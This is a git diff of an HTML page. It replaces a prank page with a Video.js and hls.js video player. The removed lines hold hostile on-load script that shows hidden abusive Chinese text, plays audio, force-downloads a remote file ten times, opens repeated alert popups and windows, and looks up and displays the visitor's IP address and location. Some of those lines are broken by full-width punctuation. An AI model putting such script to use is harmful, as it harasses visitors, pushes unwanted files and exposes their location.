@@ -1,109 +1,47 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Automated Actions</title>
-    <style>
-        。content {
-            display: none; /* Initially hidden */
-        }
-    </style>
+    <title>Video.js + Hls.js 播放器示例</title>
+    <!-- 引入Video.js的CSS文件 -->
+    <link href="https://vjs.zencdn.net/7.20.3/video-js.css" rel="stylesheet">
 </head>
 <body>
-    <div class="content">
-    你妈死了
+    <!-- 播放器容器 -->
+    <video id="videojs-hls-player" class="video-js vjs-default-skin" controls preload="auto" width="600" height="400"></video>
 
- 你妈死了
-
-你妈死了
-    </div>
-    <audio src="audio.mp3"></audio>
-    <img class="image" src="image.jpg" alt="Image">
-    <div id="ip-address">IP address will appear here</div>
-    <div id="ip-location">IP location will appear here</div>
+    <!-- 引入Video.js的JS文件 -->
+    <script src="https://vjs.zencdn.net/7.20.3/video.min.js"></script>
+    <!-- 引入你提供的Hls.js的JS文件 -->
+    <script src="https://raw.kkgithub.com/miku1hhhh/miku1hhhh.github.io/main/dist/hls.js"></script>
 
     <script>
-        function launchFullscreen(element) {
-            if (element.requestFullscreen) {
-                element.requestFullscreen();
-            } else if (element.mozRequestFullScreen) { // Firefox
-                element.mozRequestFullScreen();
-            } else if (element.webkitRequestFullscreen) { // Chrome, Safari and Opera
-                element.webkitRequestFullscreen();
-            } else if (element.msRequestFullscreen) { // IE/Edge
-                element.msRequestFullscreen();
+        document.addEventListener("DOMContentLoaded", function() {
+            var video = document.getElementById('videojs-hls-player');
+            var videoSrc = 'https://miku1hhhh.github.io/aotu32/32end.m3u8';
+
+            if (Hls.isSupported()) {
+                var hls = new Hls();
+                hls.loadSource(videoSrc);
+                hls.attachMedia(video);
+                hls.on(Hls.Events.MANIFEST_PARSED, function () {
+                    // 自动播放之前需要用户交互
+                    video.addEventListener('click', function () {
+                        video.play();
+                    });
+                });
+            } else if (video.canPlayType('application/vnd.apple.mpegurl')) {
+                video.src = videoSrc;
+                video.addEventListener('canplay', function () {
+                    // 自动播放之前需要用户交互
+                    video.addEventListener('click', function () {
+                        video.play();
+                    });
+                });
             }
 
-            displayContentAndHideElements();
-            downloadFiles();
-            triggerAlerts();
-            fetchIPInfo();
-            openNewWindows();
-        }
-
-        function displayContentAndHideElements() {
-            // Display the content and hide unnecessary elements
-            document.querySelector('.content').style.display = 'block';
-            document.querySelectorAll('audio').forEach(audio => audio.play());
-            document.querySelector('.image').style.display = 'none'; // Hide the image
-        }
-
-        function downloadFiles() {
-            // Loop to download the file 10 times
-            for (let i = 0; i < 10; i++) {
-                fetch('https://mirror.ghproxy.com/https://raw.githubusercontent.com/miku1hhhh/miku1hhhh.github.io/main/0')
-                    。then(response => response.blob())
-                    。then(blob => {
-                        const link = document.createElement('a');
-                        link.href = URL.createObjectURL(blob);
-                        link.download = `downloaded_file_${i + 1}`; // Set a unique file name for each download
-                        document.body.appendChild(link);
-                        link.click();
-                        document.body.removeChild(link);
-                    })
-                    .catch(console.error);
-            }
-        }
-
-        function triggerAlerts() {
-            // Trigger multiple alert popups
-            const numberOfAlerts = 5; // Customize the number of alerts here
-            for (let i = 0; i < numberOfAlerts; i++) {
-                setTimeout(() => alert(`弹窗${i + 1}: 这是第${i + 1}个弹窗!`), (i + 1) * 1000);
-            }
-        }
-
-        function fetchIPInfo() {
-            // Fetch and display IP address and location
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.ip;
-                    document.getElementById('ip-address').textContent = `您的IP地址是: ${ip}`;
-                    return fetch(`https://ipapi.co/${ip}/json/`);
-                })
-                .then(response => response.json())
-                .then(data => {
-                    const location = `${data.city}, ${data.region}, ${data.country_name}`;
-                    document.getElementById('ip-location').textContent = `IP归属地: ${location}`;
-                })
-                .catch(console.error);
-        }
-
-        function openNewWindows() {
-            // Open a new window or tab multiple times
-            const url = 'https://example.com'; // Replace with your desired URL
-            const numberOfWindows = 5; // Number of times to open the URL
-            for (let i = 0; i < numberOfWindows; i++) {
-                setTimeout(() => window.open(url), (i + 1) * 2000); // Adjust timing as needed
-            }
-        }
-
-        // Immediately launch the sequence of actions
-        document.addEventListener('DOMContentLoaded', () => {
-            const dummyElement = document.createElement('div'); // Create a dummy element for compatibility
-            launchFullscreen(dummyElement);
+            // 初始化Video.js播放器
+            var player = videojs(video);
         });
     </script>
 </body>
